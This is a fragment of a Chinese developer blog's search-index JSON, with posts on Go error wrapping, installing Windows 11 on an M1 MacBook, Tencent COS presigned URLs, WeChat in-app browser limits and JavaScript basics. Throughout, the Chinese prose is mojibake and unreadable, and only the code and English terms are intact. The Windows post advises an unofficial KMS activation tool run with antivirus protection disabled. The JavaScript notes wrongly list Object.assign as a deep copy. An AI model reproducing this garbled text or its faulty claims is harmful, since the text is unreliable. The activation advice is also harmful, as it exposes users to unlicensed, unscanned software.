errors.New() äº§ç”Ÿé”™è¯¯ åœ¨ä¸šåŠ¡ä»£ç ä¸­ä¸å…¶ä»–åŒ…åä½œæ—¶ï¼Œä½¿ç”¨ errors.Wrap() åŒ…è£…é”™è¯¯ éœ€è¦ä¸ Sentinel Errors æ¯”è¾ƒæ—¶ï¼Œè°ƒç”¨ errors.Cause() è·å–åŸå§‹é”™è¯¯ è°ƒç”¨å…¶ä»–åŒ…ä¸­çš„æ–¹æ³•æ—¶ï¼Œç›´æ¥è¿”å›é”™è¯¯æœ¬èº« åœ¨ç¨‹åºé¡¶å±‚å¤„ç†æ•è·åˆ°çš„é”™è¯¯ï¼Œä¾‹å¦‚å¯ä»¥ç”¨ %+v æ‰“å°å †æ ˆä¿¡æ¯ åœ¨éä¸šåŠ¡ä»£ç ä¸­ï¼ˆå¦‚ç¼–å†™åº“æ—¶ï¼‰ï¼Œåªèƒ½è¿”å›åŸå§‹é”™è¯¯ é”™è¯¯è¢«å¤„ç†åï¼Œä¸èƒ½å†è¢«ç»§ç»­è¿”å› ç®€å•æ¥è¯´ï¼Œå°±æ˜¯åº•å±‚åŒ…è£…ã€ä¸­å±‚ä¼ é€’ã€é¡¶å±‚å¤„ç†ã€‚ ","date":"2021-09-08","objectID":"/go-error/:4:0","tags":["Go"],"title":"è¿·é€”çŸ¥è¿”ï¼šGo Error å¤„ç†","uri":"/go-error/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"Go 1.13 Errors Go 1.13 çš„ errors æ ‡å‡†åº“ä¸­å¼•å…¥äº† Is å’Œ As æ–¹æ³•ï¼Œåªè¦é”™è¯¯ç±»å‹ä¸­å®ç°äº† Unwrap() æ–¹æ³•è¿”å›åŸå§‹é”™è¯¯ï¼Œå°±å¯ä»¥ç”¨ errors.Is(err, MyError) æ¥ä»£æ›¿ == åˆ¤æ–­é”™è¯¯å€¼ï¼Œå¹¶é€šè¿‡ errors.As(err, \u0026myError) ä»£æ›¿ç±»å‹æ–­è¨€åˆ¤æ–­é”™è¯¯ç±»å‹ã€‚ ä¸è¿‡ï¼Œgithub.com/pkg/errors ä¹Ÿå…¼å®¹è¿™ä¸€ç‰¹æ€§ï¼Œå› æ­¤å¯ä»¥æ›¿ä»£æ ‡å‡†åº“ä½¿ç”¨ã€‚ ","date":"2021-09-08","objectID":"/go-error/:5:0","tags":["Go"],"title":"è¿·é€”çŸ¥è¿”ï¼šGo Error å¤„ç†","uri":"/go-error/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"Eliminate Errors ä¸åœåœ°å†™ if err != nil æŒºçƒ¦çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³å°½é‡å°‘å†™ç‚¹ã€‚æ¯”å¦‚åœ¨ä¸‹é¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æƒ³è¦ç»Ÿè®¡æ–‡ä»¶è¡Œæ•°ï¼š func CountLine(r io.Reader) (int, error) { var ( br = bufio.NewReader(r) lines int err error ) for { _, err = br.ReadString('\\n') lines++ if err != nil { break } } if err != io.EOF { return 0, err } return lines, nil } åœ¨ for å¾ªç¯ä¸­ ReadString å‡ºé”™ï¼Œæˆ–æ˜¯æ— å†…å®¹å¯è¯»è¿”å› io.EOFï¼Œéƒ½ä¼šè·³å‡ºå¾ªç¯ï¼Œè¿™å°±è¦æ±‚æˆ‘ä»¬æ•è·ä¸¤æ¬¡é”™è¯¯ã€‚ ä½†å¦‚æœæˆ‘ä»¬å€ŸåŠ© Scanner çš„ Scan() æ–¹æ³•å’Œ Err() æ–¹æ³•ï¼Œå°±å¯ä»¥å»æ‰é”™è¯¯æ•è·çš„ä»£ç ï¼š func CountLines(r io.Reader) (int, error) { sc := bufio.NewScanner(r) lines := 0 for sc.Scan() { lines++ } return lines, sc.Err() } å¯ä»¥å‘ç°ï¼ŒScanner åœ¨å‡ºé”™æ—¶ä¼šå°†é”™è¯¯æš‚å­˜åˆ° sc.Err() çš„è¿”å›å€¼ä¸­ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥æ¨¡ä»¿è¿™ä¸ªæ€è·¯ï¼ŒæŠŠä¸€ä¸ª error å’Œä¸€ä¸ªå®¹æ˜“äº§ç”Ÿé”™è¯¯çš„å¯¹è±¡ä¸€èµ·å°è£…è¿›ä¸€ä¸ªç»“æ„ä½“é‡Œï¼Œç„¶ååœ¨æ–¹æ³•å†…éƒ¨ç›´æ¥æ•è·é”™è¯¯ï¼š type errWriter struct { io.Writer err error } func (e *errWriter) Write(buf []byte) (int, error) { if e.err != nil { return 0, e.err } var n int n, e.err = e.Writer.Write(buf) return n, nil } è¿™æ ·ï¼Œåœ¨è°ƒç”¨ Write æ–¹æ³•æ—¶ï¼ˆä¾‹å¦‚ io.Copyï¼‰å°±ä¸å†éœ€è¦åœ¨å¤–éƒ¨å¤„ç†é”™è¯¯äº†ã€‚ ","date":"2021-09-08","objectID":"/go-error/:6:0","tags":["Go"],"title":"è¿·é€”çŸ¥è¿”ï¼šGo Error å¤„ç†","uri":"/go-error/"},{"categories":["æ¢ç´¢"],"content":"æ‹–äº†å¾ˆä¹…æ‰æ¥å°é²œã€‚ å€ŸåŠ© Parallels Desktop 17ï¼Œæ­è½½ M1 èŠ¯ç‰‡çš„ MBP ä¹Ÿå¯ä»¥è¿è¡Œ ARM ç‰ˆçš„ Windows äº†ã€‚å¾ˆæƒ³å°è¯•ä¸€ä¸‹æœ€æ–°çš„ Win11ï¼Œä½†å´å‘ç°ä¸æ»¡è¶³éœ€è¦ TPM èŠ¯ç‰‡çš„è¦æ±‚ï¼Œå› æ­¤æƒ³åŠæ³•ç»•è¿‡äº†è¿™ä¸€é™åˆ¶ã€‚ ","date":"2021-08-26","objectID":"/m1-win11/:0:0","tags":["ARM"],"title":"æŒæˆˆè¯•é©¬ï¼šåœ¨ MacBook Pro M1 ä¸Šè¿è¡Œ Windows 11","uri":"/m1-win11/"},{"categories":["æ¢ç´¢"],"content":"è·å–ç³»ç»Ÿ ISO ä¸ºäº†ç»•è¿‡ TPMï¼Œéœ€è¦é‡‡ç”¨ä» Win10 å‡çº§çš„æ–¹æ³•ã€‚é¦–å…ˆåœ¨ UUP dump ä¸‹è½½ Win10 arm64 åŠ Win11 arm64 çš„è„šæœ¬ï¼ˆæµ‹è¯•æ—¶é‡‡ç”¨çš„å‡ä¸ºæœ€æ–°çš„ Insider Preview ç‰ˆæœ¬ï¼‰ï¼Œåœ¨ä¸€å° Windows ç”µè„‘ä¸Šè¿è¡Œ uup_download_windows.cmd å³å¯æ‰“åŒ…å¥½ä¸¤ä¸ª ISOã€‚ ä¹‹æ‰€ä»¥éœ€è¦ Windows ç”µè„‘æ¥è¿è¡Œè„šæœ¬ï¼Œæ˜¯å› ä¸ºéœ€è¦åœ¨ ISO ä¸­åŒ…å« Windows æ›´æ–°ã€‚å¦‚æœæ— è§†æ›´æ–°ï¼Œä¹Ÿå¯ä»¥åœ¨ Linux æˆ– macOS ä¸Šè¿è¡Œç›¸åº”å¹³å°çš„è„šæœ¬ã€‚ ","date":"2021-08-26","objectID":"/m1-win11/:1:0","tags":["ARM"],"title":"æŒæˆˆè¯•é©¬ï¼šåœ¨ MacBook Pro M1 ä¸Šè¿è¡Œ Windows 11","uri":"/m1-win11/"},{"categories":["æ¢ç´¢"],"content":"æ‰‹åŠ¨åˆ¶ä½œå‡çº§åŒ… é€šè¿‡æ­£å¸¸æµç¨‹åœ¨ Parallels ä¸­å®‰è£…å¥½ Win10 è™šæ‹Ÿæœºï¼Œéšåå°†ä¸¤ä¸ª ISO æ‹–å…¥è™šæ‹Ÿæœºä¸­ã€‚å°† Win10 çš„ ISO ä¸­çš„å…¨éƒ¨æ–‡ä»¶å¤åˆ¶åˆ°è™šæ‹Ÿæœºä¸­çš„ä¸€ä¸ªç›®å½•ä¸‹ï¼Œéšåç”¨ Win11 çš„ ISO ä¸­çš„å¦‚ä¸‹ä¸‰ä¸ªæ–‡ä»¶ï¼Œæ›¿æ¢è¯¥ç›®å½•ä¸‹çš„åŒåæ–‡ä»¶ï¼š sources/install.wim sources/boot.wim sources/winsetupboot.sys è¿™æ ·å‡çº§åŒ…å°±åšå®Œäº†ã€‚å¯ä»¥å‘ç°ï¼Œè¿™æ ·åšæœ¬è´¨ä¸Šæ˜¯ä¸ºäº†åœ¨å®‰è£… Win 11 æ—¶ï¼Œè®©å®‰è£…å‘å¯¼è®¤ä¸ºå®‰è£…çš„ç³»ç»Ÿç‰ˆæœ¬æ˜¯ Win10ã€‚ ","date":"2021-08-26","objectID":"/m1-win11/:2:0","tags":["ARM"],"title":"æŒæˆˆè¯•é©¬ï¼šåœ¨ MacBook Pro M1 ä¸Šè¿è¡Œ Windows 11","uri":"/m1-win11/"},{"categories":["æ¢ç´¢"],"content":"å‡çº§åˆ° Windows 11 è¿è¡Œä¸Šè¿°ç›®å½•ä¸‹çš„ setup ç¨‹åºï¼Œè€å¿ƒç­‰å¾…å³å¯ã€‚ ","date":"2021-08-26","objectID":"/m1-win11/:3:0","tags":["ARM"],"title":"æŒæˆˆè¯•é©¬ï¼šåœ¨ MacBook Pro M1 ä¸Šè¿è¡Œ Windows 11","uri":"/m1-win11/"},{"categories":["æ¢ç´¢"],"content":"åç»­ç‰ˆæœ¬å‡çº§ ç”±äº Windows 11 ARM è¿˜åœ¨é¢„è§ˆä½“éªŒé˜¶æ®µï¼Œéœ€è¦æ‹¥æœ‰ä¸€ä¸ªæ³¨å†Œäº† Windows é¢„è§ˆä½“éªŒè®¡åˆ’çš„è´¦å·å¹¶åœ¨è™šæ‹Ÿæœºé‡Œç™»å½•ã€‚ç™»å½•åå°±å¯ä»¥åœ¨è®¾ç½®ä¸­æ–¹ä¾¿åœ°è¿›è¡Œåç»­æ›´æ–°äº†ã€‚ ","date":"2021-08-26","objectID":"/m1-win11/:4:0","tags":["ARM"],"title":"æŒæˆˆè¯•é©¬ï¼šåœ¨ MacBook Pro M1 ä¸Šè¿è¡Œ Windows 11","uri":"/m1-win11/"},{"categories":["æ¢ç´¢"],"content":"æ¿€æ´» ç»è¿‡ç²—ç•¥è°ƒæŸ¥ï¼Œç›®å‰å”¯ä¸€æ¯”è¾ƒå¯é çš„éæ­£è§„æ–¹æ³•æ˜¯ä½¿ç”¨ HEU KMS 24 è¿™æ¬¾æ¿€æ´»å·¥å…·ï¼Œä½¿ç”¨å‰éœ€è¦å…³é—­ Windows å®‰å…¨ä¸­å¿ƒçš„ç—…æ¯’é˜²æŠ¤ç›¸å…³åŠŸèƒ½ã€‚ ","date":"2021-08-26","objectID":"/m1-win11/:5:0","tags":["ARM"],"title":"æŒæˆˆè¯•é©¬ï¼šåœ¨ MacBook Pro M1 ä¸Šè¿è¡Œ Windows 11","uri":"/m1-win11/"},{"categories":["æ¢ç´¢"],"content":"è®°å½•äº†å¼€å‘ä¸­é‡åˆ°çš„å’Œè…¾è®¯ç”Ÿæ€ç›¸å…³çš„ä¸€äº›é—®é¢˜ã€‚ æˆ‘æ›¾ç»æŠ±æ€¨ QQ çš„èŠ±é‡Œèƒ¡å“¨ï¼Œåæ¥å‡ºç°äº†å¾®ä¿¡ï¼›æˆ‘æ›¾ç»æŠ±æ€¨å¾®ä¿¡çš„åŠŸèƒ½æ®‹ç–¾ï¼Œåæ¥å‡ºç°äº†å¾®ä¿¡å°ç¨‹åºï¼›æˆ‘æ›¾ç»æŠ±æ€¨å°ç¨‹åºçš„ç”Ÿæ€å°é—­ï¼Œç°åœ¨å‘ç°åŸæ¥ QQ å’Œå¾®ä¿¡çš„å†…ç½®æµè§ˆå™¨ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚ ","date":"2021-08-21","objectID":"/tencent-eco/:0:0","tags":["å¾®ä¿¡"],"title":"é—­é—¨é€ è½¦ï¼šè…¾è®¯ç”Ÿæ€çš„æ³¥æ²¼","uri":"/tencent-eco/"},{"categories":["æ¢ç´¢"],"content":"è…¾è®¯äº‘ COS å…ˆè®°å½•ä¸€ä¸ªæ— å¯åšéçš„å°é—®é¢˜ï¼Œå‡ºç°åœ¨ Go SDK æ–‡æ¡£ä¸­ â€œé¢„ç­¾å URLâ€ éƒ¨åˆ†ã€‚å®é™…ä¸Šï¼Œæ–‡æ¡£ä¸­å¹¶æ²¡æœ‰å‡ºç°é”™è¯¯ï¼Œåªæ˜¯å¯¹äºåˆæ¬¡æ¥è§¦çš„å¼€å‘è€…æ¥è¯´å¯èƒ½é€ æˆè¯¯è§£ã€‚ å¼€å‘ä¸­çš„ä¸€ä¸ªå¸¸è§éœ€æ±‚å°±æ˜¯å‘ COS ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åè·å–å¯¹åº”çš„ URL ä¾›å‰ç«¯ä¸‹è½½è¯¥æ–‡ä»¶ã€‚å› æ­¤åœ¨æ–‡æ¡£ä¸­ï¼Œæˆ‘é¦–å…ˆçœ‹åˆ°äº† â€œä¸Šä¼ è¯·æ±‚ç¤ºä¾‹â€ çš„ä»£ç ï¼š ak := \"SECRETID\" sk := \"SECRETKEY\" name := \"exampleobject\" ctx := context.Background() f := strings.NewReader(\"test\") // 1. é€šè¿‡æ™®é€šæ–¹å¼ä¸Šä¼ å¯¹è±¡ _, err := client.Object.Put(ctx, name, f, nil) if err != nil { panic(err) } // è·å–é¢„ç­¾å URL presignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodPut, name, ak, sk, time.Hour, nil) if err != nil { panic(err) } // 2. é€šè¿‡é¢„ç­¾åæ–¹å¼ä¸Šä¼ å¯¹è±¡ data := \"test upload with presignedURL\" f = strings.NewReader(data) req, err := http.NewRequest(http.MethodPut, presignedURL.String(), f) if err != nil { panic(err) } // ç”¨æˆ·å¯è‡ªè¡Œè®¾ç½®è¯·æ±‚å¤´éƒ¨ req.Header.Set(\"Content-Type\", \"text/html\") _, err = http.DefaultClient.Do(req) if err != nil { panic(err) } æ˜¾ç„¶ï¼Œè¿™é‡Œçš„ 1ã€2 ä¸¤ç‚¹æ˜¯ä¸¤ç§ä¸åŒçš„ä¸Šä¼ æ–¹å¼ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©ä½¿ç”¨ç¬¬ä¸€ç§æ–¹å¼ï¼Œå¹¶é€šè¿‡ç¬¬ 14 è¡Œçš„ä»£ç è·å–äº†é¢„ç­¾å URLã€‚ç„¶è€Œï¼Œè®¿é—®è¿™ä¸€ URL å´ä¼šè¿”å› â€œç­¾åä¸ä¸€è‡´â€ çš„é”™è¯¯ä¿¡æ¯ï¼Œæ— æ³•ä¸‹è½½æ–‡ä»¶ã€‚ ç»§ç»­å‘ä¸‹çœ‹æ–‡æ¡£ï¼Œå¯ä»¥çœ‹åˆ° â€œä¸‹è½½è¯·æ±‚ç¤ºä¾‹â€ çš„ä»£ç ï¼š ak := \"SECRETID\" sk := \"SECRETKEY\" name := \"exampleobject\" ctx := context.Background() // 1. é€šè¿‡æ™®é€šæ–¹å¼ä¸‹è½½å¯¹è±¡ resp, err := client.Object.Get(ctx, name, nil) if err != nil { panic(err) } bs, _ := ioutil.ReadAll(resp.Body) resp.Body.Close() // è·å–é¢„ç­¾å URL presignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodGet, name, ak, sk, time.Hour, nil) if err != nil { panic(err) } // 2. é€šè¿‡é¢„ç­¾å URL ä¸‹è½½å¯¹è±¡ resp2, err := http.Get(presignedURL.String()) if err != nil { panic(err) } bs2, _ := ioutil.ReadAll(resp2.Body) resp2.Body.Close() if bytes.Compare(bs2, bs) != 0 { panic(errors.New(\"content is not consistent\")) } å¦‚æœä½¿ç”¨ç¬¬ 13 è¡Œçš„ä»£ç æ¥è·å–é¢„ç­¾å URLï¼Œåˆ™è®¿é—®è¯¥ URL å¯ä»¥æˆåŠŸä¸‹è½½æ–‡ä»¶ï¼Œè¿™ä¹Ÿæ˜¯è¿™æ®µä»£ç å« â€œä¸‹è½½è¯·æ±‚ç¤ºä¾‹â€ çš„åŸå› ã€‚ä¸éš¾å‘ç°ï¼Œä¸¤ç§è·å– URL çš„æ–¹å¼å”¯ä¸€çš„åŒºåˆ«åœ¨äºç¬¬äºŒä¸ªå‚æ•°ï¼Œä¸‹è½½é‡‡ç”¨ GET æ–¹æ³•ï¼Œä¸Šä¼ é‡‡ç”¨ PUT æ–¹æ³•ã€‚å› æ­¤å®é™…ä¸Š â€œè·å–é¢„ç­¾å URLâ€ çš„è¿™æ®µä»£ç å¹¶ä¸å±äºç¬¬ä¸€ç§æ–¹æ³•ï¼Œè€Œæ˜¯å±äºç¬¬äºŒç§æ–¹æ³•ã€‚ æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æ³¨é‡Šæ¥é¿å…äº§ç”Ÿè¯¯è§£ï¼Œå¦‚ä¸Šä¼ è¯·æ±‚ç¤ºä¾‹ï¼š ak := \"SECRETID\" sk := \"SECRETKEY\" name := \"exampleobject\" ctx := context.Background() f := strings.NewReader(\"test\") // 1. é€šè¿‡æ™®é€šæ–¹å¼ä¸Šä¼ å¯¹è±¡ _, err := client.Object.Put(ctx, name, f, nil) if err != nil { panic(err) } // 2. é€šè¿‡é¢„ç­¾åæ–¹å¼ä¸Šä¼ å¯¹è±¡ // è·å–é¢„ç­¾å URL presignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodPut, name, ak, sk, time.Hour, nil) if err != nil { panic(err) } // ä¸Šä¼ å¯¹è±¡ data := \"test upload with presignedURL\" f = strings.NewReader(data) req, err := http.NewRequest(http.MethodPut, presignedURL.String(), f) if err != nil { panic(err) } // ç”¨æˆ·å¯è‡ªè¡Œè®¾ç½®è¯·æ±‚å¤´éƒ¨ req.Header.Set(\"Content-Type\", \"text/html\") _, err = http.DefaultClient.Do(req) if err != nil { panic(err) } ä¸‹è½½è¯·æ±‚ç¤ºä¾‹ï¼š ak := \"SECRETID\" sk := \"SECRETKEY\" name := \"exampleobject\" ctx := context.Background() // 1. é€šè¿‡æ™®é€šæ–¹å¼ä¸‹è½½å¯¹è±¡ resp, err := client.Object.Get(ctx, name, nil) if err != nil { panic(err) } bs, _ := ioutil.ReadAll(resp.Body) resp.Body.Close() // 2. é€šè¿‡é¢„ç­¾å URL ä¸‹è½½å¯¹è±¡ // è·å–é¢„ç­¾å URL presignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodGet, name, ak, sk, time.Hour, nil) if err != nil { panic(err) } // ä¸‹è½½å¯¹è±¡ resp2, err := http.Get(presignedURL.String()) if err != nil { panic(err) } bs2, _ := ioutil.ReadAll(resp2.Body) resp2.Body.Close() if bytes.Compare(bs2, bs) != 0 { panic(errors.New(\"content is not consistent\")) } æœ€åï¼Œå¯¹äºæ­£å¸¸ä¸šåŠ¡ä¸­å…ˆä¸Šä¼ æ–‡ä»¶ã€åè¿”å›ä¸‹è½½ URL çš„éœ€æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥æ‹¼æ¥ä¸¤ä»½ç¤ºä¾‹ä»£ç ï¼š ak := \"SECRETID\" sk := \"SECRETKEY\" name := \"exampleobject\" ctx := context.Background() f := strings.NewReader(\"test\") // é€šè¿‡æ™®é€šæ–¹å¼ä¸Šä¼ å¯¹è±¡ _, err := client.Object.Put(ctx, name, f, nil) if err != nil { panic(err) } // è·å–é¢„ç­¾å URL presignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodGet, name, ak, sk, time.Hour, nil) if err != nil { panic(err) } // return presignedURL.String() ","date":"2021-08-21","objectID":"/tencent-eco/:1:0","tags":["å¾®ä¿¡"],"title":"é—­é—¨é€ è½¦ï¼šè…¾è®¯ç”Ÿæ€çš„æ³¥æ²¼","uri":"/tencent-eco/"},{"categories":["æ¢ç´¢"],"content":"å¾®ä¿¡å†…ç½®æµè§ˆå™¨ ä»¥ä¸‹é—®é¢˜åœ¨å®‰å“ / è‹¹æœæ‰‹æœºè‡ªå¸¦çš„æµè§ˆå™¨ä¸­å‡ä¸å­˜åœ¨ï¼š ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œæ— æ³•è¯†åˆ« accept=\".mp4,.mov\" ç­‰æ‰©å±•åé™åˆ¶ï¼Œåªèƒ½ä½¿ç”¨ accept=\"video/*\" ç­‰ç±»å‹é™åˆ¶ã€‚ ä¸Šä¼ å¤šä¸ªæ–‡ä»¶æ—¶ï¼Œæ— æ³•åŒæ—¶ä½¿ç”¨å¤šä¸ªç±»å‹é™åˆ¶ï¼ˆå¦‚ accept=\"image/*, video/*\"ï¼‰ã€‚äºæ˜¯åªèƒ½å°†å›¾ç‰‡å’Œè§†é¢‘ä¸Šä¼ åˆ†å¼€äº†ã€‚ ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œæ— æ³•è°ƒç”¨æ ‡å‡† web api ä¸­çš„å¯¹åº”æ¥å£ã€‚æˆ‘åœ¨é¡¹ç›®ä¸­æ˜¯æ ¹æ® è¿™ä¸ªåŠæ³• åˆ¤æ–­æ˜¯å¦åœ¨å¾®ä¿¡æµè§ˆå™¨ä¸­ï¼Œéšåå‘åç«¯ä¼ é€’ä¸åŒçš„å‚æ•°ï¼Œä½¿å¾—åç«¯è¿”å›ä¸åŒç±»å‹çš„ç»“æœã€‚ æ‰“å¼€å¤–éƒ¨ URL æ—¶ï¼Œæ— æ³•è°ƒç”¨æ ‡å‡† web api ä¸­çš„å¯¹åº”æ¥å£ã€‚åæ¥è¿™ä¸ªéœ€æ±‚æ”¹äº†ï¼Œç»•è¿‡äº†è¿™ä¸ªé—®é¢˜ã€‚ é€šè¿‡ URL æ‰“å¼€è§†é¢‘æ—¶ï¼Œå¯ä»¥æ’­æ”¾ï¼Œå³ä¸‹è§’ä¹Ÿæœ‰ä¸‹è½½æŒ‰é’®ï¼Œä½†æ— æ³•ä¸‹è½½ã€‚å› ä¸ºæ˜¯åå°çš„åŠŸèƒ½ï¼Œä¸»è¦ä½¿ç”¨å¹³å°æ˜¯ PC Web ç«¯ï¼Œæ‰€ä»¥æ²¡è§£å†³ã€‚ è§£å†³ä¸Šè¿°é—®é¢˜çš„é€šç”¨æ–¹æ¡ˆï¼Œæ˜¯å¼•å¯¼ç”¨æˆ·ç‚¹å‡»å³ä¸Šè§’å¹¶é€‰æ‹© â€œåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€â€ï¼Œè¿™ä¸ªæªæ–½å¹³æ—¶ä¹Ÿè§å¾—å¾ˆå¤šäº†ã€‚ ä¸ºä»€ä¹ˆå¾®ä¿¡å†…ç½®æµè§ˆå™¨å¦‚æ­¤ç‰¹åˆ«ï¼Ÿå…¶å®è¿˜æ˜¯å¾®ä¿¡å°ç¨‹åºä¸€æ ·çš„å¥—è·¯ï¼Œå¼ºè¿«å¼€å‘è€…ä½¿ç”¨ è‡ªå·±çš„ SDKã€‚ æ€»çš„æ¥è¯´ï¼Œæœ‰æ„ä¸éµå¾ªé€šç”¨çš„ Web APIã€å°é—­è‡ªå·±çš„ç”Ÿæ€ï¼Œæ— è®ºæ˜¯å‡ºäºä»€ä¹ˆç›®çš„éƒ½è®©äººç›¸å½“ä¸å¿«ã€‚ ","date":"2021-08-21","objectID":"/tencent-eco/:2:0","tags":["å¾®ä¿¡"],"title":"é—­é—¨é€ è½¦ï¼šè…¾è®¯ç”Ÿæ€çš„æ³¥æ²¼","uri":"/tencent-eco/"},{"categories":["å‰ç«¯"],"content":"æ¸©æ•…è€ŒçŸ¥æ–°ï¼Œå¤ä¹ åæ‰å‘ç°å¾ˆå¤šåŸºç¡€æŒæ¡å¾—ä¸ç‰¢å›ºã€‚ ","date":"2021-07-29","objectID":"/js-misc/:0:0","tags":["Javascript"],"title":"æ¸©æ•…çŸ¥æ–°ï¼šJavascript æ‚è®°","uri":"/js-misc/"},{"categories":["å‰ç«¯"],"content":"æ•°æ®ç±»å‹ typeof æ£€æŸ¥è¾“å…¥å‚æ•°æœºå™¨ç åä¸‰ä½ï¼Œ000 ä»£è¡¨ object ç±»å‹ï¼Œè€Œ null æ°å¥½ç”¨å…¨ 0 è¡¨ç¤ºã€‚ typeof null // object typeof å¯¹äºæœªå®ç° [[Call]] æ–¹æ³•çš„å¼•ç”¨ç±»å‹è¿”å› object ï¼Œå·²å®ç°è¯¥æ–¹æ³•çš„åˆ™è¿”å› functionã€‚ typeof Array // function ç®€å•ç±»å‹å’Œä½œä¸º object çš„å¤æ‚ç±»å‹ï¼š typeof 'hello' // string typeof new String('hello') // object instanceof åˆ¤æ–­å®ä¾‹æ—¶å‘ä¸Šè¿½è¸ªåŸå‹é“¾ã€‚ [] instanceof Array [] instanceof Object æ¯” typeof æ›´å‡†ç¡®çš„ç±»å‹åˆ¤æ–­ï¼š Object.prototype.toString.call([]) // Array é€»è¾‘è¿ç®—ç¬¦ä¸éå¸ƒå°”ç±»å‹æ··ç”¨ï¼š 5 || 0 // 5 0 || 'a' // 'a' 5 \u0026\u0026 0 // 0 æ‹†ç®±æ—¶è°ƒç”¨ toPrimitive() æ–¹æ³•ï¼š å¦‚æœæ˜¯åŸå§‹ç±»å‹å€¼åˆ™ç›´æ¥è¿”å›ï¼› å¦åˆ™è°ƒç”¨ .valueOf()ï¼Œå¦‚æœè¿”å›å€¼æ˜¯åŸå§‹ç±»å‹å€¼åˆ™è¿”å›ï¼› å¦åˆ™è°ƒç”¨ .toString()ï¼Œè¿”å›å¾—åˆ°çš„ stringã€‚ [].valueOf() // [] [].toString() // '' {}.valueOf() // {} {}.toString() // [object Object] [] + [] // '' [] + {} // [object Object] éƒ¨åˆ†æµè§ˆå™¨ä¸­å°† {} è§†ä½œç©ºä»£ç å—ï¼š { } ;+[] // 0 ","date":"2021-07-29","objectID":"/js-misc/:1:0","tags":["Javascript"],"title":"æ¸©æ•…çŸ¥æ–°ï¼šJavascript æ‚è®°","uri":"/js-misc/"},{"categories":["å‰ç«¯"],"content":"æ·±æµ…æ‹·è´ ","date":"2021-07-29","objectID":"/js-misc/:2:0","tags":["Javascript"],"title":"æ¸©æ•…çŸ¥æ–°ï¼šJavascript æ‚è®°","uri":"/js-misc/"},{"categories":["å‰ç«¯"],"content":"æµ…æ‹·è´ éå†èµ‹å€¼ for (var i in origin) { clone[i] = origin[i] } Object.createï¼Œå®é™…ä¼šæ‹·è´åˆ° clone çš„ _proto_ ä¸Šï¼š clone = Object.create(origin) ","date":"2021-07-29","objectID":"/js-misc/:2:1","tags":["Javascript"],"title":"æ¸©æ•…çŸ¥æ–°ï¼šJavascript æ‚è®°","uri":"/js-misc/"},{"categories":["å‰ç«¯"],"content":"æ·±æ‹·è´ å€ŸåŠ© JSONï¼š clone = JSON.parse(JSON.stringify(origin)) Object.assignï¼Œä¸ç©ºå¯¹è±¡åˆå¹¶ï¼š clone = Object.assign({}, origin) ","date":"2021-07-29","objectID":"/js-misc/:2:2","tags":["Javascript"],"title":"æ¸©æ•…çŸ¥æ–°ï¼šJavascript æ‚è®°","uri":"/js-misc/"},{"categories":["å‰ç«¯"],"content":"ç¼–ç  escape ä¸ä¼šå¯¹å­—æ¯ã€æ•°å­—ä»¥åŠ *@-_+./ è¿›è¡Œç¼–ç ï¼Œå¯¹å…¶ä»–æ‰€æœ‰å­—ç¬¦å‡è¿›è¡Œç¼–ç ï¼Œç›®å‰å·²åºŸå¼ƒã€‚ encodeURI å°†è¾“å…¥å‚æ•°è§†ä½œå®Œæ•´çš„ URIï¼Œä¸ä¼šå¯¹å­—æ¯ã€æ•°å­—ä»¥åŠ ,/?:@\u0026=+$# è¿›è¡Œç¼–ç ï¼Œå¯¹å…¶ä»–æ‰€æœ‰å­—ç¬¦å‡è¿›è¡Œç¼–ç ã€‚ encodeURIComponent å°†è¾“å…¥å‚æ•°è§†ä½œ URI çš„ä¸€éƒ¨åˆ†ï¼Œä¸ä¼šå¯¹å­—æ¯ã€æ•°å­—ä»¥åŠ -_.!~*'() è¿›è¡Œç¼–ç ï¼Œå¯¹å…¶ä»–æ‰€æœ‰å­—ç¬¦å‡è¿›è¡Œç¼–ç ã€‚ ","date":"2021-07-29","objectID":"/js-misc/:3:0","tags":["Javascript"],"title":"æ¸©æ•…çŸ¥æ–°ï¼šJavascript æ‚è®°","uri":"/js-misc/"},{"categories":["å‰ç«¯"],"content":"å‡½æ•°ä¸ä½œç”¨åŸŸ å‡½æ•°ä¸å˜é‡çš„å£°æ˜ä¼šè¢«æå‰åˆ°æ‰€åœ¨ä½œç”¨åŸŸæœ€å‰é¢ã€‚å˜é‡èµ‹å€¼ä¸ä¼šè¢«æå‰ã€‚ é—­åŒ…ï¼š function foo() { var a = 2 function bar() { console.log(a) } return bar } var baz = foo() baz() // 2 ä¸€ä¸ªç»å…¸ä¾‹å­ï¼Œtimer è®¿é—®åˆ°çš„ i æ˜¯å¾ªç¯ç»“æŸåçš„å…¨å±€ä½œç”¨åŸŸä¸­çš„ iï¼š for (var i = 1; i \u003c= 5; ++i) { setTimeout(function timer() { console.log(i) }, i * 1000) } // 6 6 6 6 6 è§£å†³æ–¹æ¡ˆï¼š ç”¨ IIFE åˆ›å»ºä½œç”¨åŸŸ for (var i = 1; i \u003c= 5; ++i) { ;(function (j) { setTimeout(function timer() { console.log(j) }, j * 1000) })(i) } // 1 2 3 4 5 å€ŸåŠ© let çš„ç‰¹æ€§ for (let i = 1; i \u003c= 5; ++i) { setTimeout(function timer() { console.log(i) }, i * 1000) } // 1 2 3 4 5 ç±»æ•°ç»„è½¬ä¸º Arrayï¼š arr = Array.prototype.slice.apply(args) å®é™…ä¸Šï¼Œè°ƒç”¨ applyã€callã€bind ç­‰æ–¹æ³•å‡ä¼šå¯¹ this è¿›è¡Œæ˜¾å¼ç»‘å®šã€‚ this 